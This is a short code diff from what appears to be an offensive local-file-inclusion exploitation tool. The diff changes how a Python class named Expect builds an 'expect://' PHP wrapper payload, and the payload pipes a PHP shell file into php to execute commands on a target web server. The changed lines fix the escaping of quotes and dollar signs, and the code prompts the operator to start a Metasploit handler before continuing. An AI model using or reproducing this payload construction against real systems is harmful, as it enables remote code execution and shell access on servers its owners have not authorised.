@@ -214,9 +214,9 @@ class Expect:
         # Build payload
         if self.nostager:
             payload_file = open("/tmp/{0}.php".format(shell),"r")
-            payload = "expect://echo '\\"
-            payload += quote_plus(payload_file.read())
-            payload += "' \\| php"
+            payload = "expect://echo \""
+            payload += quote_plus(payload_file.read().replace("\"","\\\"").replace("$","\\$"))
+            payload += "\" | php"
             payload_file.close()
             raw_input(t.green(" [!] ") + "Press enter to continue when your metasploit handler is running...") 
         else:
